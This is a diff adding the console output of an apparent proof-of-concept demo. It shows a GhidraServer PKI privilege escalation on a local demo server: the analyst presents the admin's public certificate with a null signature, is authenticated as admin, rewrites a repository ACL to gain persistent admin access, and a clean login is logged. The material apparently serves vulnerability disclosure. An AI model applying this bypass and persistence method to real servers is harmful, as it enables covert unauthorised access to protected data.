@@ -1,0 +1,132 @@
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ STEP 1 — Analyst checks access (BEFORE exploit)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  The analyst authenticates with LEGITIMATE credentials.
+  Because they are not in the repository ACL, they see nothing.
+
+========================================================================
+ GhidraServer PKI Privilege Escalation — Null Signature Bypass
+========================================================================
+
+  Target server:   ::1:13100
+  User cert:       CN=analyst, O=GhidraDemo, C=US
+  CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Mode:            Normal authentication
+
+
+========================================================================
+ CONNECTED — AUTHENTICATED AS: analyst
+========================================================================
+
+  Server users (2):
+    - admin
+    - analyst
+  Repositories (0):
+
+========================================================================
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ STEP 2 — Run exploit (null-signature impersonation + ADMIN escalation)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  The analyst presents admin's PUBLIC certificate with a null signature.
+  The server skips verification entirely and authenticates them as admin.
+  The exploit then adds the analyst's real account as ADMIN on every repo.
+
+========================================================================
+ GhidraServer PKI Privilege Escalation — Null Signature Bypass
+========================================================================
+
+  Target server:   ::1:13100
+  User cert:       CN=analyst, O=GhidraDemo, C=US
+  CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Target cert:     CN=admin, O=GhidraDemo, C=US
+  Mode:            EXPLOIT + ESCALATE (null signature bypass)
+
+
+========================================================================
+ EXPLOIT SUCCEEDED — AUTHENTICATED AS: admin
+========================================================================
+
+  mTLS layer identity:        CN=analyst, O=GhidraDemo, C=US
+  Application layer identity:  admin (from CN=admin, O=GhidraDemo, C=US)
+  Target private key used:     NO
+
+  Server users (2):
+    - admin
+    - analyst
+
+────────────────────────────────────────────────────────────────────────
+ ESCALATION: Granting attacker persistent ADMIN access
+────────────────────────────────────────────────────────────────────────
+
+[E1] Determining attacker's real server username...
+     Attacker username: analyst
+
+[E3] Escalating attacker on 1 repository(ies)...
+
+     Repository: SecretAnalysis
+     Current ACL:
+       admin (admin)
+     Updated ACL:
+       admin (admin)
+       analyst (admin)
+
+────────────────────────────────────────────────────────────────────────
+ VERIFICATION: Attacker authenticating with own credentials
+────────────────────────────────────────────────────────────────────────
+
+  (Normal authentication — no exploit, using attacker's own
+   certificate and private key to prove this persists)
+
+  Authenticated as: analyst (normal login, no exploit)
+  Accessible repositories (1):
+    - SecretAnalysis [analyst (admin)]
+
+========================================================================
+ ESCALATION COMPLETE
+========================================================================
+
+  Attacker 'analyst' now has ADMIN on all repos.
+  This access is PERSISTENT — it survives server restarts
+  and does not require further exploitation.
+========================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ STEP 3 — Analyst checks access (AFTER exploit)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  The analyst authenticates normally — no exploit, own certificate.
+  The ACL rewrite persists: they now have ADMIN on SecretAnalysis.
+
+========================================================================
+ GhidraServer PKI Privilege Escalation — Null Signature Bypass
+========================================================================
+
+  Target server:   ::1:13100
+  User cert:       CN=analyst, O=GhidraDemo, C=US
+  CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Mode:            Normal authentication
+
+
+========================================================================
+ CONNECTED — AUTHENTICATED AS: analyst
+========================================================================
+
+  Server users (2):
+    - admin
+    - analyst
+  Repositories (1):
+    - SecretAnalysis
+
+========================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ DEMO COMPLETE
+ The analyst obtained persistent ADMIN access to an admin-only repository
+ using only their own certificate and the admin's PUBLIC certificate.
+ No admin private key. No brute force. The server logged a clean login.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
